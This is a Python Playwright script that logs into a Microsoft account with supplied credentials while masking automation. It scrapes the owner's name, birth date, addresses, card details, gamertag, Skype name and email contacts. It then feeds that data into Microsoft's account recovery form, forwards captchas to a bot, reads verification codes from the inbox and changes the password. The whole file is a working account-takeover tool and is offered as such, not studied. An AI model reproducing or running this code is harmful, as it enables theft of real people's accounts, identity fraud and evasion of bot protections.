from playwright.async_api import async_playwright, Page, Browser, BrowserContext
import asyncio
import re
from typing import Dict, List, Optional

class BrowserAutomation:
    def __init__(self):
        self.playwright = None
        self.browser: Optional[Browser] = None
        self.context: Optional[BrowserContext] = None
        self.page: Optional[Page] = None
        self.account_info = {}
        self.address_info = {}
        self.payment_info = {}
        
    async def __aenter__(self):
        await self.start()
        return self
        
    async def __aexit__(self, exc_type, exc_val, exc_tb):
        await self.close()
        
    async def start(self):
        self.playwright = await async_playwright().start()
      
        self.browser = await self.playwright.chromium.launch(
            headless=True,
            args=[
                '--disable-blink-features=AutomationControlled',
                '--disable-dev-shm-usage',
                '--no-sandbox',
            ]
        )
     
        self.context = await self.browser.new_context(
            viewport={'width': 1920, 'height': 1080},
            user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        )
        self.page = await self.context.new_page()
        
    async def close(self):
        if self.page:
            await self.page.close()
        if self.context:
            await self.context.close()
        if self.browser:
            await self.browser.close()
        if self.playwright:
            await self.playwright.stop()
    
    async def login(self, email: str, password: str) -> bool:
        try:
            print(f"Starting login for: {email}")
         
            await self.page.goto("https://login.live.com", wait_until="domcontentloaded", timeout=60000)
            
            email_input = await self.page.wait_for_selector('input[type="email"], #i0116', timeout=20000)
            await email_input.fill(email)
            await self.page.keyboard.press("Enter")
            
            print("Detecting next screen...")
            found_screen = None
            for _ in range(40):
                if await self.page.is_visible('input[name="passwd"], #i0118'):
                    found_screen = "PASSWORD_FIELD"; break
                if await self.page.is_visible('text="Other ways to sign in", #signinOptions'):
                    found_screen = "BYPASS_LINK"; break
                if await self.page.is_visible('text="Use your password"'):
                    found_screen = "OPTIONS_LIST"; break
                await asyncio.sleep(0.5)

            if found_screen == "BYPASS_LINK":
                await self.page.click('text="Other ways to sign in", #signinOptions')
                await asyncio.sleep(3) 
                found_screen = "OPTIONS_LIST"

            if found_screen == "OPTIONS_LIST":
                await self.page.click('text="Use your password"')
                await asyncio.sleep(12) 

            pwd_selector = 'input[name="passwd"], input[type="password"], #i0118'
            password_input = await self.page.wait_for_selector(pwd_selector, state="visible", timeout=25000)
            await password_input.click()
            await self.page.keyboard.press("Control+A")
            await self.page.keyboard.press("Backspace")
            await password_input.type(password, delay=100)
            await asyncio.sleep(2)
            
            print("Force-Submitting...")
            await self.page.evaluate('''() => {
                const btn = document.querySelector('#idSIButton9') || document.querySelector('button[type="submit"]');
                if (btn) btn.click();
            }''')
            
            print("Monitoring redirect...")
            for i in range(40):
                curr_url = self.page.url
             
                if "login.live.com" not in curr_url or "account.microsoft.com" in curr_url:
                    print("✅ Login Successful (Redirect Detected)")
                    return True
                
                if i % 4 == 0:
                    try:
                        btn = await self.page.query_selector('#idSIButton9')
                        if btn and await btn.is_visible(): await btn.click()
                    except: pass
                await asyncio.sleep(0.5)

            if "post.srf" in self.page.url:
                print("Stuck on bridge. Attempting forced jump...")
                try:
                    await self.page.goto("https://account.microsoft.com/", wait_until="commit", timeout=30000)
                    await asyncio.sleep(5)
                except:
                    pass 
                
            is_logged_in = "login.live.com" not in self.page.url
            if is_logged_in: print("✅ Login Successful (Forced Success)")
            return is_logged_in

        except Exception as e:
            print(f"Login error: {e}")
            return False
    
    async def scrape_account_info(self) -> Dict:
        try:
            try:
                await self.page.goto("https://account.microsoft.com/profile?", wait_until="networkidle", timeout=45000)
            except:
                try:
                    await self.page.goto("https://account.microsoft.com/profile?", wait_until="load", timeout=30000)
                except:
                    try:
                        await self.page.goto("https://account.microsoft.com/profile?", wait_until="domcontentloaded", timeout=20000)
                    except:
                        await self.page.goto("https://account.microsoft.com/profile?", timeout=20000)
                        await asyncio.sleep(5)
            
            try:
                await self.page.wait_for_function("document.readyState === 'complete'", timeout=10000)
            except:
                pass
            await asyncio.sleep(3)  
            
            await self.page.evaluate("window.scrollTo(0, 300);")
            await asyncio.sleep(0.5)
            
            info = {}
            
            name_selectors = [
                "//span[@id='profile.profile-page.personal-section.full-name']",
                "//span[contains(@id, 'full-name')]",
                "//div[contains(@class, 'personal-section')]//span[contains(@class, 'name')]",
                "//h1[contains(@class, 'name')]",
                "//div[contains(@data-testid, 'name')]",
            ]
            
            for selector in name_selectors:
                try:
                    element = await self.page.wait_for_selector(f"xpath={selector}", timeout=5000)
                    if element:
                        info['full_name'] = await element.inner_text()
                        if info['full_name'] and info['full_name'].strip():
                            print(f"Found Full Name using selector: {selector}")
                            break
                except:
                    continue
            
            if 'full_name' not in info or not info['full_name']:
                info['full_name'] = ""
            
            dob_selectors = [
                "//div[contains(@id, 'date-of-birth')]//span[contains(text(),'/')]",
                "//div[contains(@id, 'birth')]//span",
                "//span[contains(text(), '/') and contains(text(), '/')]",
                "//div[contains(@class, 'birth')]//span",
                "//*[contains(@aria-label, 'birth')]",
            ]
            
            for selector in dob_selectors:
                try:
                    elements = await self.page.query_selector_all(f"xpath={selector}")
                    for elem in elements:
                        text = await elem.inner_text()
                        if '/' in text and len(text) > 5:  
                            info['date_of_birth'] = text.strip()
                            print(f"Found DOB using selector: {selector}")
                            break
                    if 'date_of_birth' in info and info['date_of_birth']:
                        break
                except:
                    continue
            
            if 'date_of_birth' not in info:
                info['date_of_birth'] = ""
            
            country_selectors = [
                "//div[contains(@class, 'country')]//span",
                "//span[contains(text(), 'Country')]/following-sibling::span",
                "//*[contains(@aria-label, 'country')]",
            ]
            
            for selector in country_selectors:
                try:
                    element = await self.page.query_selector(f"xpath={selector}")
                    if element:
                        country = await element.inner_text()
                        if country and country.strip():
                            info['country'] = country.strip()
                            print(f"Found Country using selector: {selector}")
                            break
                except:
                    continue
            
            if 'country' not in info:
                try:
                    body_text = await self.page.inner_text('body')
                    m = re.search(r"Country or region\s*\n\s*([A-Za-z\s]+)", body_text, re.MULTILINE)
                    if m:
                        info['country'] = m.group(1).splitlines()[0].strip()
                except:
                    pass
            
            if 'country' not in info:
                info['country'] = ""
            
            try:
                email_elem = await self.page.query_selector("xpath=//a[starts-with(@href, 'mailto:')]")
                if email_elem:
                    email_addr = await email_elem.inner_text()
                    if not email_addr:
                        href = await email_elem.get_attribute("href")
                        email_addr = href.replace("mailto:", "").strip() if href else ""
                    info['email'] = email_addr
            except:
                try:
                    page_source = await self.page.content()
                    pattern = r"[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}"
                    email_matches = re.findall(pattern, page_source)
                    if email_matches:
                        info['email'] = email_matches[0]
                except:
                    pass
            
            if 'email' not in info:
                info['email'] = ""
            
            self.account_info = info
            return info
        except Exception as e:
            print(f"Error scraping account info: {e}")
            return {}
    
    async def scrape_addresses(self) -> Dict:
        try:
            try:
                await self.page.goto("https://account.microsoft.com/billing/addresses", wait_until="networkidle", timeout=45000)
            except:
                try:
                    await self.page.goto("https://account.microsoft.com/billing/addresses", wait_until="load", timeout=30000)
                except:
                    try:
                        await self.page.goto("https://account.microsoft.com/billing/addresses", wait_until="domcontentloaded", timeout=20000)
                    except:
                        await self.page.goto("https://account.microsoft.com/billing/addresses", timeout=20000)
                        await asyncio.sleep(5)
            
            try:
                await self.page.wait_for_function("document.readyState === 'complete'", timeout=10000)
            except:
                pass
            await asyncio.sleep(3)  
            
            address_info = {}
            
            try:
                address_blocks = await self.page.query_selector_all("xpath=//div[contains(@class, 'ms-StackItem')]")
                
                extracted_addresses = []
                unwanted_keywords = [
                    "change", "manage", "default", "choose", "all addresses",
                    "add new", "remove", "set as", "preferred",
                    "billing info", "shipping info", "email", "address book",
                ]
                
                for block in address_blocks:
                    text = await block.inner_text()
                    if (text and not any(kw in text.lower() for kw in unwanted_keywords) 
                        and re.search(r"\d+", text)):
                        extracted_addresses.append(text)
                
                seen = set()
                unique_addresses = [
                    addr for addr in extracted_addresses
                    if addr.lower() not in seen and not seen.add(addr.lower())
                ]
                
                postal_codes_set = set()
                for addr in unique_addresses:
                    dash_pattern = r"\b\d{5}-\d{4}\b|\b\d{5}-\d{5}\b"
                    dash_codes = re.findall(dash_pattern, addr)
                    if dash_codes:
                        postal_codes_set.update(dash_codes)
                    
                    space_pattern = r"\b\d{5}\s+\d{4}\b|\b\d{5}\s+\d{5}\b"
                    space_codes = re.findall(space_pattern, addr)
                    if space_codes:
                        space_codes_normalized = [code.replace(" ", "-") for code in space_codes]
                        postal_codes_set.update(space_codes_normalized)
                    
                    extended_pattern = r"\b\d{5}\d{4}\b"
                    extended_codes = re.findall(extended_pattern, addr)
                    if extended_codes:
                        formatted_codes = [f"{code[:5]}-{code[5:]}" for code in extended_codes]
                        postal_codes_set.update(formatted_codes)
                    
                    simple_codes = re.findall(r"\b\d{4,6}\b", addr)
                    if simple_codes and not postal_codes_set:
                        sorted_codes = sorted(simple_codes, key=len, reverse=True)
                        postal_codes_set.add(sorted_codes[0])
                
                postal_codes_list = list(postal_codes_set)
                postal_codes_list.sort(key=lambda x: ("-" in x, len(x)), reverse=True)
                
                if postal_codes_list:
                    address_info['postal_code'] = postal_codes_list[0]
                
                states = ['AL', 'AK', 'AZ', 'AR', 'CA', 'CO', 'CT', 'DE', 'FL', 'GA', 'HI', 'ID', 'IL', 'IN', 'IA', 'KS', 'KY', 'LA', 'ME', 'MD', 'MA', 'MI', 'MN', 'MS', 'MO', 'MT', 'NE', 'NV', 'NH', 'NJ', 'NM', 'NY', 'NC', 'ND', 'OH', 'OK', 'OR', 'PA', 'RI', 'SC', 'SD', 'TN', 'TX', 'UT', 'VT', 'VA', 'WA', 'WV', 'WI', 'WY']
                for addr in unique_addresses:
                    for state in states:
                        if state in addr.upper():
                            address_info['state'] = state
                            break
                    if 'state' in address_info:
                        break
                    
            except Exception as e:
                print(f"Error extracting address: {e}")
            
            self.address_info = address_info
            return address_info
        except Exception as e:
            print(f"Error scraping addresses: {e}")
            return {}
    
    async def scrape_payment_methods(self) -> Dict:
        try:
            try:
                await self.page.goto("https://account.microsoft.com/billing/payments", wait_until="networkidle", timeout=45000)
            except:
                try:
                    await self.page.goto("https://account.microsoft.com/billing/payments", wait_until="load", timeout=30000)
                except:
                    try:
                        await self.page.goto("https://account.microsoft.com/billing/payments", wait_until="domcontentloaded", timeout=20000)
                    except:
                        await self.page.goto("https://account.microsoft.com/billing/payments", timeout=20000)
                        await asyncio.sleep(5)
            await asyncio.sleep(3)
            
            payment_info = {}
            
            try:
                payment_cards = await self.page.query_selector_all('.payment-card, [class*="payment"], [data-testid*="payment"]')
                if payment_cards:
                    first_card = payment_cards[0]
                    card_text = await first_card.inner_text()
                    
                    card_match = re.search(r'\*{4,}\s*(\d{4})|(\d{4})\s*\d{4}\s*\d{4}\s*(\d{4})', card_text)
                    if card_match:
                        payment_info['card_last_four'] = card_match.group(1) or card_match.group(3)
                    
                    if 'visa' in card_text.lower():
                        payment_info['card_type'] = 'Visa'
                    elif 'mastercard' in card_text.lower():
                        payment_info['card_type'] = 'Mastercard'
                    elif 'amex' in card_text.lower() or 'american express' in card_text.lower():
                        payment_info['card_type'] = 'American Express'
                    
                    expiry_match = re.search(r'(\d{2})/(\d{2,4})', card_text)
                    if expiry_match:
                        payment_info['expiry'] = expiry_match.group()
            except Exception as e:
                print(f"Error extracting payment info: {e}")
            
            self.payment_info = payment_info
            return payment_info
        except Exception as e:
            print(f"Error scraping payment methods: {e}")
            return {}
    
    async def scrape_xbox_username(self) -> str:
        try:
            await self.page.goto("https://www.xbox.com", wait_until="domcontentloaded", timeout=60000)
            await asyncio.sleep(5)
            
            try:
                username_element = await self.page.wait_for_selector('.gamertag, [class*="gamertag"], [data-testid*="gamertag"], .username, [class*="username"]', timeout=5000)
                username = await username_element.inner_text()
                return username.strip()
            except:
                await self.page.goto("https://account.xbox.com/Profile", wait_until="domcontentloaded", timeout=60000)
                await asyncio.sleep(3)
                username_element = await self.page.wait_for_selector('h1, .gamertag, [class*="gamertag"]', timeout=5000)
                username = await username_element.inner_text()
                return username.strip()
        except Exception as e:
            print(f"Error scraping Xbox username: {e}")
            return ""
    
    async def scrape_sent_emails(self) -> List[str]:
        try:
            await self.page.goto("https://outlook.live.com/mail/0/sentitems", wait_until="domcontentloaded", timeout=60000)
            await asyncio.sleep(5)
            
            sent_emails = []
            
            try:
                email_items = await self.page.query_selector_all('[role="listitem"], .ms-List-cell, [class*="mailListItem"]')
                for item in email_items[:10]:  
                    try:
                        email_text = await item.inner_text()
                        email_matches = re.findall(r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b', email_text)
                        sent_emails.extend(email_matches)
                    except:
                        continue
            except Exception as e:
                print(f"Error extracting sent emails: {e}")
            
            return list(set(sent_emails))  
        except Exception as e:
            print(f"Error scraping sent emails: {e}")
            return []
    
    async def scrape_skype_name(self) -> str:
        try:
            await self.page.goto("https://secure.skype.com/portal/profile", wait_until="domcontentloaded", timeout=60000)
            await asyncio.sleep(5)
            
            try:
                skype_name_element = await self.page.wait_for_selector('.skype-name, [class*="skype"], [data-testid*="skype"], .profile-name, h1', timeout=5000)
                skype_name = await skype_name_element.inner_text()
                return skype_name.strip()
            except:
                return ""
        except Exception as e:
            print(f"Error scraping Skype name: {e}")
            return ""
    
    async def navigate_to_account_recovery(self, email: str, interaction=None) -> dict:
        try:
            await self.page.goto("https://account.live.com/acsr", wait_until="networkidle", timeout=60000)
            await asyncio.sleep(3)
            
            account_name_input = await self.page.wait_for_selector('#AccountNameInput', timeout=20000)
            await account_name_input.fill(email)
            print(f"Filled account name: {email}")
            
            await self.page.keyboard.press("Tab")
            await asyncio.sleep(0.5)
            
            contact_email = self.account_info.get('email', '')
            if not contact_email or contact_email == email:
                contact_email = email.replace('@', '+recovery@') if '@' in email else email
            
            contact_email_field = await self.page.evaluate_handle("document.activeElement")
            await contact_email_field.fill(contact_email)
            print(f"Filled contact email: {contact_email}")
            
            captcha_element = await self.page.query_selector('img[alt*="captcha"], img[src*="captcha"], img[src*="challenge"]')
            if captcha_element:
                print("Captcha detected - Returning to bot to await user response")
                return {'needs_captcha': True}
            
            await self._click_next_button()
            return {'needs_captcha': False}
            
        except Exception as e:
            print(f"Error in navigate_to_account_recovery: {e}")
            return {'needs_captcha': False, 'error': str(e)}
    
    async def get_captcha_image(self):
        try:
            captcha_img = await self.page.query_selector('img[alt*="captcha"], img[src*="captcha"], img[src*="challenge"]')
            if captcha_img:
                screenshot = await captcha_img.screenshot()
                return screenshot
            else:
                try:
                    form_area = await self.page.query_selector('form, [role="form"], .captcha-container')
                    if form_area:
                        screenshot = await form_area.screenshot()
                        return screenshot
                except:
                    pass
        except Exception as e:
            print(f"Error getting captcha image: {e}")
        return None
    
    async def _click_next_button(self):
        next_selectors = [
            'button:has-text("Next")',
            'input[type="submit"]:has-text("Next")',
            'button[type="submit"]',
            '#idSIButton9',
            'button[id="idSIButton9"]',
            'button:has-text("Continue")',
        ]
        
        next_button = None
        for selector in next_selectors:
            try:
                next_button = await self.page.wait_for_selector(selector, timeout=5000)
                if next_button:
                    await next_button.scroll_into_view_if_needed()
                    await asyncio.sleep(1)
                    await next_button.click()
                    await asyncio.sleep(3)
                    print("✅ Clicked Next button - verification code should be sent")
                    return True
            except:
                continue
        
        if not next_button:
            print("Warning: Could not find Next button, trying Enter key")
            await self.page.keyboard.press("Enter")
            await asyncio.sleep(3)
        return False
    
    async def click_next_after_captcha(self):
        return await self._click_next_button()
    
    async def fill_captcha(self, captcha_code: str):
        try:
            captcha_input_selectors = [
                'input[aria-label*="characters"]',
                'input[placeholder*="characters"]',
                'input[id*="captcha"]',
                'input[name*="captcha"]'
            ]
            
            for selector in captcha_input_selectors:
                element = await self.page.query_selector(selector)
                if element and await element.is_visible():
                    await element.click()
                    await element.fill(captcha_code)
                    print(f"Successfully filled captcha code: {captcha_code}")
                    return True
            return False
        except Exception as e:
            print(f"Error filling captcha field: {e}")
            return False
    
    async def scrape_verification_code(self) -> Optional[str]:
        try:
            await self.page.goto("https://outlook.live.com/mail/0/inbox", wait_until="domcontentloaded", timeout=60000)
            await asyncio.sleep(5)
            
            try:
                refresh_button = await self.page.wait_for_selector('button[aria-label*="Refresh"], button[aria-label*="refresh"], [title*="Refresh"]', timeout=3000)
                if refresh_button:
                    await refresh_button.click()
                    await asyncio.sleep(3)
            except:
                await self.page.keyboard.press("F5")
                await asyncio.sleep(3)
            
            try:
                email_items = await self.page.query_selector_all('[role="listitem"], .ms-List-cell, [class*="mailListItem"], [class*="MailListItem"]')
                for item in email_items[:10]:  
                    try:
                        email_text = await item.inner_text()
                        if "microsoft" in email_text.lower() and ("code" in email_text.lower() or "verify" in email_text.lower() or "security" in email_text.lower()):
                            await item.click()
                            await asyncio.sleep(3)
                            
                            body_selectors = [
                                '.email-body',
                                '[class*="messageBody"]',
                                '.ms-MessageBody',
                                '[class*="MessageBody"]',
                                'div[role="main"]',
                                '.message-content'
                            ]
                            
                            body_text = ""
                            for selector in body_selectors:
                                try:
                                    email_body = await self.page.query_selector(selector)
                                    if email_body:
                                        body_text = await email_body.inner_text()
                                        if body_text:
                                            break
                                except:
                                    continue
                            
                            if not body_text:
                                body_text = await self.page.inner_text('body')
                            
                            code_match = re.search(r'\b\d{6,8}\b', body_text)
                            if code_match:
                                return code_match.group()
                            
                            code_match = re.search(r'\b\d{3}[\s\-]?\d{3,4}\b', body_text)
                            if code_match:
                                return code_match.group().replace(' ', '').replace('-', '')
                    except Exception as e:
                        print(f"Error processing email item: {e}")
                        continue
            except Exception as e:
                print(f"Error extracting verification code: {e}")
            
            return None
        except Exception as e:
            print(f"Error scraping verification code: {e}")
            return None
    
    async def fill_verification_and_details(self, verification_code: str, account_info: Dict, 
                                           address_info: Dict, payment_info: Dict, 
                                           xbox_username: str, sent_emails: List, skype_name: str):
        try:
            await self.page.wait_for_selector('#BirthDate_monthInput', timeout=60000)
            await asyncio.sleep(1)
            
            if account_info.get('full_name'):
                try:
                    name_parts = account_info['full_name'].split()
                    if len(name_parts) > 1:
                        first_name = " ".join(name_parts[:-1])
                        last_name = name_parts[-1]
                    else:
                        first_name = account_info['full_name']
                        last_name = ""
                    
                    first_name_field = await self.page.wait_for_selector('#FirstNameInput', timeout=10000)
                    await first_name_field.fill(first_name)
                    await asyncio.sleep(0.5)
                    
                    await self.page.keyboard.press("Tab")
                    await asyncio.sleep(0.3)
                    
                    if last_name:
                        last_name_field = await self.page.evaluate_handle("document.activeElement")
                        await last_name_field.fill(last_name)
                        await asyncio.sleep(0.5)
                except Exception as e:
                    print(f"Error filling name: {e}")
            
            if account_info.get('date_of_birth') and '/' in account_info['date_of_birth']:
                try:
                    dob = account_info['date_of_birth']
                    m, d, y = dob.split('/')
                    
                    month_select = await self.page.wait_for_selector('#BirthDate_monthInput', timeout=10000)
                    await month_select.select_option(value=m.lstrip('0'))
                    await asyncio.sleep(0.3)
                    
                    day_select = await self.page.wait_for_selector('#BirthDate_dayInput', timeout=10000)
                    await day_select.select_option(value=d.lstrip('0'))
                    await asyncio.sleep(0.3)
                    
                    year_select = await self.page.wait_for_selector('#BirthDate_yearInput', timeout=10000)
                    await year_select.select_option(value=y)
                    await asyncio.sleep(0.5)
                except Exception as e:
                    print(f"Error filling DOB: {e}")
            
            country_to_select = account_info.get('country', 'United States')
            if country_to_select and country_to_select != "Not Available":
                try:
                    country_select = await self.page.wait_for_selector('#CountryInput', timeout=10000)
                    await country_select.select_option(label=country_to_select)
                    await asyncio.sleep(0.5)
                except Exception as e:
                    print(f"Error filling country: {e}")
            
            if address_info.get('state'):
                try:
                    state_select = await self.page.wait_for_selector('#StateInput', timeout=5000)
                    options = await state_select.evaluate("""el => {
                        const opts = Array.from(el.options);
                        return opts.filter(o => o.text && o.text !== 'Select...').map(o => o.text);
                    }""")
                    if options and len(options) > 0:
                        await state_select.select_option(label=options[0])
                    await asyncio.sleep(0.5)
                except Exception as e:
                    print(f"Error filling state: {e}")
            
            if address_info.get('postal_code'):
                try:
                    postal_field = await self.page.wait_for_selector('#PostalCodeInput', timeout=10000)
                    await postal_field.click()
                    await asyncio.sleep(0.3)
                    await postal_field.fill(address_info['postal_code'])
                    await asyncio.sleep(0.5)
                except Exception as e:
                    print(f"Error filling postal code: {e}")
            
            await self.page.keyboard.press("Enter")
            await asyncio.sleep(2)
            
            try:
                checkbox = await self.page.wait_for_selector('#ProductOptionMail', timeout=300000)
                
                try:
                    password_field = await self.page.wait_for_selector('input[type="password"], input[name="Password"]', timeout=10000)
                except:
                    pass
                
                await checkbox.click()
                await asyncio.sleep(0.5)
                await self.page.keyboard.press("Enter")
                await asyncio.sleep(2)
            except Exception as e:
                print(f"Error with ProductOptionMail: {e}")
            
            try:
                email_fields = await self.page.query_selector_all('input[type="email"], input[type="text"]')
                if len(email_fields) >= 3 and sent_emails:
                    for i, email in enumerate(sent_emails[:3]):
                        if i < len(email_fields):
                            await email_fields[i].fill(email)
                            await asyncio.sleep(0.3)
                
                for _ in range(2):
                    await self.page.keyboard.press("Tab")
                    await asyncio.sleep(0.3)
                
            except Exception as e:
                print(f"Error filling emails/subjects: {e}")
            
            await self.page.keyboard.press("Enter")
            await asyncio.sleep(2)
            
        except Exception as e:
            print(f"Error filling verification and details: {e}")
    
    async def change_password(self, new_password: str) -> bool:
        try:
            await self.page.goto("https://account.live.com/password/Change", wait_until="domcontentloaded", timeout=60000)
            await asyncio.sleep(5)
            
            verification_code = await self.scrape_verification_code()
            if not verification_code:
                return False
            
            code_input = await self.page.wait_for_selector('input[name*="code"], input[id*="code"]', timeout=10000)
            await code_input.fill(verification_code)
            await asyncio.sleep(1)
            
            new_pass_input = await self.page.wait_for_selector('input[name*="password"], input[type="password"]', timeout=10000)
            await new_pass_input.fill(new_password)
            await asyncio.sleep(1)
            
            confirm_pass_input = await self.page.wait_for_selector('input[name*="confirm"], input[id*="confirm"]', timeout=5000)
            if confirm_pass_input:
                await confirm_pass_input.fill(new_password)
                await asyncio.sleep(1)
            
            submit_button = await self.page.wait_for_selector('button:has-text("Save"), button:has-text("Change"), input[type="submit"]', timeout=5000)
            await submit_button.click()
            await asyncio.sleep(3)
            
            current_url = self.page.url
            if "success" in current_url.lower() or "changed" in current_url.lower():
                return True
            
            try:
                success_message = await self.page.wait_for_selector('text=/success|changed|updated/i', timeout=3000)
                if success_message:
                    return True
            except:
                pass
            
            return False
        except Exception as e:
            print(f"Error changing password: {e}")
            return False